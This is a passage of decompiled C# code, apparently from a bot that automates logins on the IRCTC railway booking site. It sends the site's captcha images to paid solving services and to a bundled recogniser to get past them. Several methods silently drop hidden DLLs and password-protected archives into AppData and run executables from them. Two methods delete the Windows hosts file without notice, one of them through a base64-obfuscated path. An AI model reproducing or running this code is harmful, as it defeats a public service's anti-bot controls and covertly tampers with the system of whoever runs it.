				string name10 = "calc";
				string value6 = "1";
				nameValueCollection2.Add(name10, value6);
			}
			if (flag5)
			{
				string name11 = "is_russian";
				string value7 = "1";
				nameValueCollection2.Add(name11, value7);
			}
			using WebClient webClient = new WebClient();
			webClient.Proxy = null;
			for (int i = 0; i < 7; i++)
			{
				Encoding uTF = Encoding.UTF8;
				string text3 = "http://";
				string text4 = string_8;
				string text5 = "/in.php";
				text = uTF.GetString(webClient.UploadValues(text3 + text4 + text5, nameValueCollection2));
				string text6 = text;
				string value8 = "OK|";
				if (!text6.Contains(value8))
				{
					string text7 = text;
					string value9 = "ERROR_NO_SLOT_AVAILABLE";
					if (text7.Contains(value9))
					{
						Thread.Sleep(1800);
						continue;
					}
					string text8 = text;
					string value10 = "ERROR_";
					if (!text8.Contains(value10))
					{
						string text9 = text;
						string value11 = "OK|";
						if (!text9.Contains(value11))
						{
							string text10 = "UNKNOWN_ERROR: ";
							return text10 + text;
						}
						continue;
					}
					return text;
				}
				clsMain clsMain3 = class28_0;
				string text11 = "Rip_captcha Submit Result: ";
				clsMain3.Lock(text11 + text);
				string text12 = text;
				string value12 = "ERROR_";
				if (!text12.Contains(value12))
				{
					string text13 = text;
					string oldValue = "OK|";
					string text14 = (string_10 = text13.Replace(oldValue, "").Trim());
					for (int j = 0; j < 14; j++)
					{
						Thread.Sleep(1800);
						string[] array = new string[6];
						string text15 = "http://";
						array[0] = text15;
						array[1] = string_8;
						string text16 = "/res.php?key=";
						array[2] = text16;
						array[3] = text2;
						string text17 = "&action=get&id=";
						array[4] = text17;
						array[5] = text14;
						text = webClient.DownloadString(string.Concat(array));
						string text18 = text;
						string value13 = "ERROR_NO_SLOT_AVAILABLE";
						if (text18.Contains(value13))
						{
							continue;
						}
						string text19 = text;
						string value14 = "ERROR_";
						string text23;
						if (!text19.Contains(value14))
						{
							string text20 = text;
							string value15 = "OK|";
							if (!text20.Contains(value15))
							{
								continue;
							}
							clsMain clsMain4 = class28_0;
							string text21 = "Rip_captcha received: ";
							clsMain4.Lock(text21 + text.ToUpper().Trim());
							string text22 = text.ToUpper().Trim();
							string oldValue2 = "OK|";
							text23 = text22.Replace(oldValue2, "");
							if (text23.Length == 5)
							{
								string text24 = text23.ToUpper();
								string text25 = "ERROR";
								if (!(text24 == text25))
								{
									string text26 = text23.ToUpper();
									string text27 = "BLANK";
									if (!(text26 == text27))
									{
										string text28 = text23.ToUpper();
										string text29 = "BLACK";
										if (!(text28 == text29))
										{
											string text30 = text23.ToUpper();
											string text31 = "WRONG";
											if (!(text30 == text31))
											{
												method_27(text23);
												goto IL_0555;
											}
										}
									}
								}
							}
							string[] array2 = new string[6];
							string text32 = "http://";
							array2[0] = text32;
							array2[1] = string_8;
							string text33 = "/res.php?key=";
							array2[2] = text33;
							array2[3] = text2;
							string text34 = "&action=reportbad&id=";
							array2[4] = text34;
							array2[5] = text14;
							text = webClient.DownloadString(string.Concat(array2));
							goto IL_0555;
						}
						clsMain clsMain5 = class28_0;
						string text35 = "Rip_captcha Error: ";
						clsMain5.Lock(text35 + text.ToUpper().Trim());
						return text;
						IL_0555:
						return text23;
					}
					break;
				}
				return text;
			}
		}
		catch (Exception ex)
		{
			clsMain clsMain6 = class28_0;
			string text36 = "RecognizeRIP ERR=";
			clsMain6.Lock(text36 + ex.Message);
		}
		finally
		{
			method_28(false);
		}
		return text;
	}

	internal string method_23(byte[] byte_0, int int_6)
	{
		string text = "";
		try
		{
			method_28(true);
			string text2 = "http://api.endcaptcha.com/upload";
			string text3 = text2;
			long ticks = DateTime.Now.Ticks;
			string text4 = "x";
			string text5 = ticks.ToString(text4);
			string string_ = "username";
			string text6 = smethod_8(string_, string_11, text5);
			string string_2 = "password";
			string text7 = text6 + smethod_8(string_2, string_12, text5);
			string[] array = new string[5] { text7, null, null, null, null };
			string string_3 = "image";
			string @string = Encoding.Default.GetString(byte_0);
			string string_4 = "image.png";
			string string_5 = "image/png";
			array[1] = smethod_9(string_3, @string, string_4, string_5, text5);
			string text8 = "--";
			array[2] = text8;
			array[3] = text5;
			string text9 = "--     ";
			array[4] = text9;
			text7 = string.Concat(array);
			string text10 = text7;
			int num = 0;
			while (num <= 14)
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text3);
				string userAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15 WebMoney Advisor";
				httpWebRequest.UserAgent = userAgent;
				string accept = "*/*";
				httpWebRequest.Accept = accept;
				WebHeaderCollection headers = httpWebRequest.Headers;
				string name = "Accept-Language";
				string value = "ru";
				headers.Add(name, value);
				httpWebRequest.Proxy = null;
				httpWebRequest.KeepAlive = true;
				httpWebRequest.AllowAutoRedirect = false;
				if (!string.IsNullOrEmpty(text7))
				{
					string method = "POST";
					httpWebRequest.Method = method;
					string text11 = "multipart/form-data; boundary=";
					httpWebRequest.ContentType = text11 + text5;
					byte[] bytes = Encoding.Default.GetBytes(text7);
					httpWebRequest.ContentLength = bytes.Length;
					httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
				}
				else
				{
					string method2 = "GET";
					httpWebRequest.Method = method2;
				}
				try
				{
					HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
					StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
					string text12 = streamReader.ReadToEnd().ToUpper();
					streamReader.Close();
					httpWebResponse.Close();
					string text13 = text3;
					string value2 = "api.endcaptcha.com/report";
					if (!text13.Contains(value2))
					{
						string text14 = text12;
						string value3 = "ERROR";
						if (!text14.Contains(value3))
						{
							string text15 = text12;
							string value4 = "UNSOLVED_YET";
							if (!text15.Contains(value4))
							{
								goto IL_02d2;
							}
							string text16 = "http://api.endcaptcha.com";
							string text17 = text12;
							string text18 = text12;
							string value5 = ":";
							text3 = text16 + text17.Substring(text18.IndexOf(value5) + 1).ToLower();
							text7 = "";
							num++;
							continue;
						}
						string text19 = "ERROR";
						text12 = text19;
						goto IL_02d2;
					}
					return text;
					IL_02d2:
					if (text12.Length == 5)
					{
						string text20 = text12.ToUpper();
						string text21 = "ERROR";
						if (!(text20 == text21))
						{
							string text22 = text12.ToUpper();
							string text23 = "BLANK";
							if (!(text22 == text23))
							{
								string text24 = text12.ToUpper();
								string text25 = "BLACK";
								if (!(text24 == text25))
								{
									string text26 = text12.ToUpper();
									string text27 = "WRONG";
									if (!(text26 == text27))
									{
										text = text12.ToUpper();
										method_27(text);
										clsMain clsMain2 = class28_0;
										string text28 = "RecognizeEndCaptcha : ";
										clsMain2.Lock(text28 + text);
										return text;
									}
								}
							}
						}
					}
					text7 = text10;
					string text29 = "http://api.endcaptcha.com/report";
					text3 = text29;
					num = 0;
				}
				catch (Exception)
				{
					return text;
				}
			}
		}
		catch
		{
		}
		finally
		{
			method_28(false);
		}
		return text;
	}

	internal string method_24(byte[] byte_0, int int_6)
	{
		string text = "";
		string text2 = "";
		try
		{
			method_28(true);
			NameValueCollection nameValueCollection = smethod_1(string_11, string_12);
			string name = "balance";
			string arg = nameValueCollection[name];
			string format = "Your balance is {0}";
			Console.WriteLine(format, arg);
			NameValueCollection nameValueCollection2 = smethod_4(string_11, string_12, byte_0);
			string name2 = "captcha";
			string string_ = nameValueCollection2[name2];
			string name3 = "text";
			string text3 = nameValueCollection2[name3];
			string oldValue = "+";
			string newValue = " ";
			string text4 = text3.Replace(oldValue, newValue);
			_ = DateTime.Now.Ticks;
			int num = 5;
			int num2 = 0;
			while (text4 == "" && num2 < num)
			{
				if (num2 == 0)
				{
					Thread.Sleep(5000);
				}
				else
				{
					Thread.Sleep(2000);
				}
				NameValueCollection nameValueCollection3 = smethod_3(string_);
				string name4 = "text";
				string text5 = nameValueCollection3[name4];
				string oldValue2 = "+";
				string newValue2 = " ";
				text4 = text5.Replace(oldValue2, newValue2);
				string text6 = "tryCount ";
				string text7 = num2.ToString();
				string text8 = " ";
				Console.WriteLine(text6 + text7 + text8 + text4);
			}
			if (string.IsNullOrEmpty(text4) || text4.Length != 5)
			{
				string text9 = "XXXXX";
				text = text9;
				method_27(text);
				clsMain clsMain2 = class28_0;
				string text10 = "RecognizeDecaptchaHTTP : ";
				clsMain2.Lock(text10 + text);
				return text;
			}
			text = text4.ToUpper();
			method_27(text);
			clsMain clsMain3 = class28_0;
			string text11 = "RecognizeDecaptchaHTTP : ";
			clsMain3.Lock(text11 + text);
			return text;
		}
		catch (Exception ex)
		{
			clsMain clsMain4 = class28_0;
			string text12 = "RecognizeDecaptcha out:";
			string text13 = "  Ex:";
			clsMain4.method_74(text12 + text2 + text13, ex.Message);
			return text;
		}
		finally
		{
			method_28(false);
		}
	}

	internal static string smethod_8(string string_16, string string_17, string string_18)
	{
		object[] array = new object[14];
		string text = "--";
		array[0] = text;
		array[1] = string_18;
		array[2] = '\r';
		array[3] = '\n';
		string text2 = "Content-Disposition: form-data; name=\"";
		array[4] = text2;
		array[5] = string_16;
		string text3 = "\"";
		array[6] = text3;
		array[7] = '\r';
		array[8] = '\n';
		array[9] = '\r';
		array[10] = '\n';
		array[11] = string_17;
		array[12] = '\r';
		array[13] = '\n';
		string result = string.Concat(array);
		Class10.object_0 = array;
		return result;
	}

	internal static string smethod_9(string string_16, string string_17, string string_18, string string_19, string string_20)
	{
		string text = "--";
		string text2 = "\r\n";
		string text3 = text + string_20 + text2;
		string[] array = new string[7] { text3, null, null, null, null, null, null };
		string text4 = "Content-Disposition: form-data; name=\"";
		array[1] = text4;
		array[2] = string_16;
		string text5 = "\"; filename=\"";
		array[3] = text5;
		array[4] = string_18;
		string text6 = "\"";
		array[5] = text6;
		string[] array2 = new string[6]
		{
			23.ToString(),
			null,
			null,
			null,
			null,
			null
		};
		string text7 = "Content-Type: ";
		array2[1] = text7;
		array2[2] = string_19;
		string text8 = " \r\n\r\n";
		array2[3] = text8;
		array2[4] = string_17;
		string text9 = "\r\n";
		array2[5] = text9;
		array[6] = string.Concat(array2);
		return string.Concat(array);
	}

	internal string method_26(byte[] byte_0, int int_6)
	{
		return "";
	}

	private void method_27(object object_1)
	{
		try
		{
			if (txtImageData.InvokeRequired)
			{
				txtImageData.Invoke(new ParameterizedThreadStart(method_27), object_1);
			}
			else if (object_1.ToString().Length > 2)
			{
				txtImageData.Text = object_1.ToString();
			}
		}
		catch
		{
		}
	}

	private void method_28(object object_1)
	{
		try
		{
			if (picOriginal.InvokeRequired)
			{
				picOriginal.Invoke(new ParameterizedThreadStart(method_28), object_1);
				return;
			}
			picOriginal.Refresh();
			if (bool.Parse(object_1.ToString()))
			{
				picOriginal.Image = image_0;
				string loginType = class28_0.LoginType;
				string text = "APP";
				if (loginType == text)
				{
					picOriginal.BackColor = Color.Black;
				}
				else
				{
					picOriginal.BackColor = Color.DeepPink;
				}
			}
			else
			{
				picOriginal.Image = picOriginal.InitialImage;
				picOriginal.BackColor = Color.AntiqueWhite;
				picOriginal.SizeMode = PictureBoxSizeMode.Normal;
			}
			picOriginal.Refresh();
			if (bool.Parse(object_1.ToString()))
			{
				method_0();
				if (clsMain.bool_16)
				{
					string object_2 = SolveCaptcha(base64inage).Trim();
					method_27(object_2);
				}
			}
		}
		catch (Exception ex)
		{
			Console.Write(ex.Message.ToString());
		}
	}

	internal string method_29(byte[] byte_0, int int_6)
	{
		string text = "";
		string[] array = new string[3];
		string text2 = "RUMO";
		array[0] = text2;
		array[1] = string_14.Substring(0, 16);
		array[2] = string_14.Substring(16, 16);
		string[] array2 = array;
		if (array2.Length >= 3)
		{
			string text3 = "https://gate1a.skipinput.com/q_gate.php?b=firefox&v=3000&l=en&key=";
			string string_ = text3 + array2[1];
			string text4 = "key=";
			string text5 = array2[2];
			string text6 = "&fields=1%7C%7C0%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/javax.faces.resource/irctc_logo_en_IN.gif.jsf%3Fln%3Dimages%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/javax.faces.resource/CRIS-Full_en_IN.png.jsf%3Fln%3Dimages%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/arrow_navdown.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/arrow_navdown.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/arrow_navdown.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/arrow_navdown.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/arrow_navdown.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/new_navicon.gif%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/download_ios_app.gif%0A2%7C%7C1%0A16%7C%7C2%7C%7CT%3Aj_username%7C%7CT%3Aj_captcha%7C%7CR%3Alabeltxt%20captchacls%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/captchaImage%7C%7CI%3Ahttps%3A//www.irctc.co.in/eticketing/resources/images/refresh.gif%0A";
			string string_2 = text4 + text5 + text6;
			CookieContainer cookieContainer_ = null;
			string string_3 = "";
			string string_4 = "";
			WebException webException_ = null;
			bool bool_ = false;
			HttpStatusCode httpStatusCode_ = HttpStatusCode.Accepted;
			clsMain clsMain2 = class28_0;
			string string_5 = "Inside RecognizeRumola";
			clsMain2.Lock(string_5);
			try
			{
				method_28(true);
				if (!class28_0.method_85(string_, string_2, "", null, ref cookieContainer_, bool_63: false, bool_64: true, 40000, 40000, ref string_3, ref string_4, ref webException_))
				{
					goto IL_02d1;
				}
				string text7 = string_3;
				string value = "CAPTCHA(s) found";
				if (!text7.Contains(value))
				{
					goto IL_02d1;
				}
				string text8 = string_3;
				string text9 = string_3;
				string value2 = "||";
				string text10 = text8.Substring(text9.LastIndexOf(value2) + 2);
				string text11 = "https://gate1a.skipinput.com/b_gate.php?b=firefox&v=3000&key=";
				string text12 = "&f=0";
				string_ = text11 + text10 + text12;
				string_2 = Convert.ToBase64String(byte_0);
				if (!class28_0.method_85(string_, string_2, "", null, ref cookieContainer_, bool_63: false, bool_64: true, 10000, 10000, ref string_3, ref string_4, ref webException_))
				{
					goto IL_02c7;
				}
				string text13 = string_3;
				string value3 = "WAIT";
				if (!text13.Contains(value3))
				{
					goto IL_02c7;
				}
				string text14 = "https://gate1a.skipinput.com/b_gate.php?b=firefox&v=3000&key=";
				string_ = text14 + text10;
				for (int i = 0; i < 7; i++)
				{
					Thread.Sleep(2500);
					class28_0.method_100(string_, "", null, ref cookieContainer_, bool_63: false, bool_64: true, 10000, ref string_3, ref bool_, ref webException_, ref httpStatusCode_, ref string_4);
					string text15 = string_3;
					string value4 = "|OK|";
					if (!text15.Contains(value4))
					{
						string text16 = string_3;
						string value5 = "Sorry";
						if (text16.Contains(value5))
						{
							break;
						}
						continue;
					}
					string text17 = string_3;
					string text18 = string_3;
					string value6 = "||";
					text = text17.Substring(text18.LastIndexOf(value6) + 2).ToUpper().Trim();
					clsMain clsMain3 = class28_0;
					string text19 = "RecognizeRumola received: ";
					clsMain3.Lock(text19 + text);
					method_27(text);
					method_28(false);
					return text;
				}
				goto end_IL_00b8;
				IL_02c7:
				return "";
				IL_02d1:
				return "";
				end_IL_00b8:;
			}
			catch (Exception ex)
			{
				clsMain clsMain4 = class28_0;
				string string_6 = "RecognizeRumola";
				clsMain4.method_74(string_6, ex.Message);
			}
			finally
			{
				method_28(false);
			}
			return text;
		}
		return "";
	}

	private void lnkOTP_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		lnkOTP.Visible = false;
		ThreadPool.QueueUserWorkItem(method_30);
	}

	private void method_30(object object_1)
	{
		try
		{
			bool_10 = true;
			WebException webException_ = null;
			string string_ = "";
			string string_2 = "";
			clsMain clsMain2 = class28_0;
			string string_3 = "Resend OTP Called";
			clsMain2.Lock(string_3);
			class28_0.method_85(string_5, this.string_3, string_6, null, ref cookieContainer_0, bool_63: true, bool_64: false, 10000, 10000, ref string_, ref string_2, ref webException_);
		}
		catch
		{
		}
	}

	public static void smethod_12(object object_1)
	{
		try
		{
			string text = pks;
			bool flag = false;
			string path = "XCaptchaRecog.exe";
			if (!File.Exists(Path.Combine(text, path)))
			{
				flag = true;
			}
			string path2 = "spiky5.dll";
			string text2 = Path.Combine(text, path2);
			string path3 = "spiky6.zip";
			string text3 = Path.Combine(text, path3);
			if (!flag)
			{
				return;
			}
			if (File.Exists(text))
			{
				File.Delete(text2);
			}
			if (!File.Exists(text2))
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				string name = "NEXUS.Extention.XCaptchaRecog.dll";
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text2).Attributes = FileAttributes.Hidden;
				}
			}
			if (!File.Exists(text2))
			{
				return;
			}
			if (!File.Exists(text3))
			{
				File.Copy(text2, text3, overwrite: true);
			}
			File.Delete(text2);
			try
			{
				ZipFile zipFile = ZipFile.Read(text3);
				try
				{
					zipFile.ExtractAll(text);
				}
				finally
				{
					zipFile?.Dispose();
				}
				File.Delete(text3);
			}
			catch (Exception ex)
			{
				File.Delete(text3);
				MessageBox.Show(ex.Message);
			}
		}
		catch
		{
		}
	}

	public static void ExtractCOMM(object object_1)
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string text = "\\Microsoft\\COMMhttp";
			string text2 = folderPath + text;
			bool flag = false;
			string path = "COMMhttp.exe";
			if (!File.Exists(Path.Combine(text2, path)))
			{
				flag = true;
			}
			string text3 = "spiky55.dll";
			string text4 = text3;
			string text5 = "spiky65.zip";
			string text6 = text5;
			if (!flag)
			{
				return;
			}
			if (File.Exists(text2))
			{
				File.Delete(text4);
			}
			if (!File.Exists(text4))
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				string name = "IRCommDLL.include.COMM.dll";
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text4, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text4).Attributes = FileAttributes.Hidden;
				}
			}
			if (!File.Exists(text4))
			{
				return;
			}
			if (!File.Exists(text6))
			{
				File.Copy(text4, text6, overwrite: true);
			}
			File.Delete(text4);
			try
			{
				ZipFile zipFile = ZipFile.Read(text6);
				try
				{
					zipFile.ExtractAll(text2);
				}
				finally
				{
					zipFile?.Dispose();
				}
				File.Delete(text6);
			}
			catch (Exception ex)
			{
				File.Delete(text6);
				MessageBox.Show(ex.Message);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string Base64Encode(string plainText)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void ExtractFile0(object object_1)
	{
		try
		{
			Extract_Config(0);
			string systemDirectory = Environment.SystemDirectory;
			string base64EncodedData = "ZHJpdmVyc1xcZXRjXFxob3N0cw==";
			string path = Path.Combine(systemDirectory, Base64Decode(base64EncodedData));
			if (File.Exists(path))
			{
				File.Delete(path);
			}
			bool flag = false;
			string path2 = "SeleniumExtras.WaitHelpers.dll";
			if (File.Exists(path2))
			{
				return;
			}
			string path3 = "SeleniumExtras.WaitHelpers.dll";
			if (!File.Exists(path3))
			{
				flag = true;
			}
			string text = "spiky5.dll";
			string text2 = text;
			string text3 = "spiky6.zip";
			string text4 = text3;
			if (flag && !File.Exists(text2))
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				string name = "IRCommDLL.include.SeleniumExtras.dll";
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text2).Attributes = FileAttributes.Hidden;
				}
			}
			if (!File.Exists(text2))
			{
				return;
			}
			if (!File.Exists(text4))
			{
				File.Copy(text2, text4, overwrite: true);
			}
			File.Delete(text2);
			try
			{
				ZipFile zipFile = ZipFile.Read(text4);
				try
				{
					zipFile.ExtractAll(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently);
				}
				finally
				{
					zipFile?.Dispose();
				}
				File.Delete(text4);
			}
			catch (Exception ex)
			{
				File.Delete(text4);
				MessageBox.Show(ex.Message);
			}
		}
		catch
		{
		}
	}

	public static void Extract_Config(object object_1)
	{
		try
		{
			string systemDirectory = Environment.SystemDirectory;
			string path = "drivers\\etc\\hosts";
			string path2 = Path.Combine(systemDirectory, path);
			if (File.Exists(path2))
			{
				File.Delete(path2);
			}
			bool flag = false;
			string path3 = "Hitman.exe.config";
			if (File.Exists(path3))
			{
				return;
			}
			string path4 = "Hitman.exe.config";
			if (!File.Exists(path4))
			{
				flag = true;
			}
			string text = "spiky5.dll";
			string text2 = text;
			string text3 = "spiky6.zip";
			string text4 = text3;
			if (flag && !File.Exists(text2))
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				string name = "IRCommDLL.include.config.dll";
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text2).Attributes = FileAttributes.Hidden;
				}
			}
			if (!File.Exists(text2))
			{
				return;
			}
			if (!File.Exists(text4))
			{
				File.Copy(text2, text4, overwrite: true);
			}
			File.Delete(text2);
			try
			{
				ZipFile zipFile = ZipFile.Read(text4);
				try
				{
					zipFile.ExtractAll(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently);
				}
				finally
				{
					zipFile?.Dispose();
				}
				File.Delete(text4);
			}
			catch (Exception)
			{
				File.Delete(text4);
			}
		}
		catch
		{
		}
	}

	public static void EAGetMail_Extract(object object_1)
	{
		try
		{
			bool flag = false;
			string path = "MailKit.dll";
			if (File.Exists(path))
			{
				return;
			}
			string path2 = "MailKit.dll";
			if (!File.Exists(path2))
			{
				flag = true;
			}
			string text = "spiky5.dll";
			string text2 = text;
			string text3 = "spiky6.zip";
			string text4 = text3;
			if (flag && !File.Exists(text2))
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				string name = "IRCommDLL.include.Mail.dll";
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text2).Attributes = FileAttributes.Hidden;
				}
			}
			if (!File.Exists(text2))
			{
				return;
			}
			if (!File.Exists(text4))
			{
				File.Copy(text2, text4, overwrite: true);
			}
			File.Delete(text2);
			try
			{
				using (ZipFile zipFile = ZipFile.Read(text4))
				{
					zipFile.ExtractAll(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently);
				}
				File.Delete(text4);
			}
			catch (Exception ex)
			{
				File.Delete(text4);
				MessageBox.Show(ex.Message);
			}
		}
		catch
		{
		}
	}

	private static void D_method_31(object object_1)
	{
		try
		{
			string text = pks;
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			bool flag = false;
			string path = "CaptchaRecog_CShape.exe";
			if (!File.Exists(Path.Combine(text, path)))
			{
				flag = true;
			}
			string path2 = "spiky5.dll";
			string text2 = Path.Combine(text, path2);
			string path3 = "spiky6.zip";
			string text3 = Path.Combine(text, path3);
			if (!flag)
			{
				return;
			}
			File.Delete(text2);
			File.Delete(text3);
			if (!File.Exists(text2))
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				string name = "IRCommDLL.include.CaptchaRecog_CShape.dll";
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text2).Attributes = FileAttributes.Hidden;
				}
			}
			if (!File.Exists(text2))
			{
				return;
			}
			if (!File.Exists(text3))
			{
				File.Copy(text2, text3, overwrite: true);
			}
			File.Delete(text2);
			try
			{
				ZipFile zipFile = ZipFile.Read(text3);
				try
				{
					string password = "DM04AP16MS3";
					zipFile.Password = password;
					zipFile.ExtractAll(text);
				}
				finally
				{
					zipFile?.Dispose();
				}
				File.Delete(text3);
			}
			catch (Exception ex)
			{
				File.Delete(text3);
				MessageBox.Show(ex.Message);
			}
		}
		catch
		{
		}
	}

	private void method_31(object object_1)
	{
		try
		{
			string text = pks;
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			bool flag = false;
			string path = "CaptchaRecog_CShape.exe";
			if (!File.Exists(Path.Combine(text, path)))
			{
				flag = true;
			}
			string path2 = "spiky5.dll";
			string text2 = Path.Combine(text, path2);
			string path3 = "spiky6.zip";
			string text3 = Path.Combine(text, path3);
			if (!flag)
			{
				return;
			}
			File.Delete(text2);
			File.Delete(text3);
			if (!File.Exists(text2))
			{
				Assembly executingAssembly = Assembly.GetExecutingAssembly();
				string name = "IRCommDLL.include.CaptchaRecog_CShape.dll";
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
				if (manifestResourceStream != null)
				{
					FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
					for (int i = 0; i < manifestResourceStream.Length; i++)
					{
						fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
					}
					fileStream.Close();
					new FileInfo(text2).Attributes = FileAttributes.Hidden;
				}
			}
			if (!File.Exists(text2))
			{
				return;
			}
			if (!File.Exists(text3))
			{
				File.Copy(text2, text3, overwrite: true);
			}
			File.Delete(text2);
			try
			{
				ZipFile zipFile = ZipFile.Read(text3);
				try
				{
					string password = "DM04AP16MS3";
					zipFile.Password = password;
					zipFile.ExtractAll(text);
				}
				finally
				{
					zipFile?.Dispose();
				}
				File.Delete(text3);
			}
			catch (Exception ex)
			{
				File.Delete(text3);
				MessageBox.Show(ex.Message);
			}
		}
		catch
		{
		}
	}

	internal string SolveCaptcha(string bs64)
	{
		method_31(0);
		string text = string.Empty;
		try
		{
			string text2 = "|NGET|";
			string arguments = bs64 + text2;
			Process process = new Process();
			ProcessStartInfo startInfo = process.StartInfo;
			string path = pks;
			string path2 = "XCaptchaRecog.exe";
			startInfo.FileName = Path.Combine(path, path2);
			process.StartInfo.Arguments = arguments;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			StreamReader standardOutput = process.StandardOutput;
			process.WaitForExit(3500);
			text = standardOutput.ReadLine();
			if (!process.HasExited)
			{
				process.Kill();
			}
		}
		catch (Exception)
		{
		}
		if (string.IsNullOrEmpty(text))
		{
			try
			{
				string path3 = pks;
				string path4 = "XCaptchaRecog.exe";
				string path5 = Path.Combine(path3, path4);
				if (File.Exists(path5))
				{
					File.Delete(path5);
					smethod_12(0);
				}
			}
			catch
			{
			}
		}
		return text;
	}

	public static string D_SolveCaptcha(string bs64)
	{
		D_method_31(0);
		string result = string.Empty;
		D_method_31(0);
		try
		{
			string text = "|NGET|";
			string arguments = bs64 + text;
			Process process = new Process();
			ProcessStartInfo startInfo = process.StartInfo;
			string path = pks;
			string path2 = "CaptchaRecog_CShape.exe";
			startInfo.FileName = Path.Combine(path, path2);
			process.StartInfo.Arguments = arguments;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			StreamReader standardOutput = process.StandardOutput;
			process.WaitForExit(3500);
			result = standardOutput.ReadLine();
			if (!process.HasExited)
			{
				process.Kill();
			}
		}
		catch (Exception)
		{
		}
		return result;
	}

	private void btnCancel_Click(object sender, EventArgs e)
	{
		method_12();
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		DateTime now = DateTime.Now;
		_ = now.Hour;
		_ = now.Minute;
		_ = now.Second;
	}

	public static string Encrypt(string string_0)
	{
		byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(string_4, 8));
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		byte[] bytes2 = Encoding.UTF8.GetBytes(string_0);
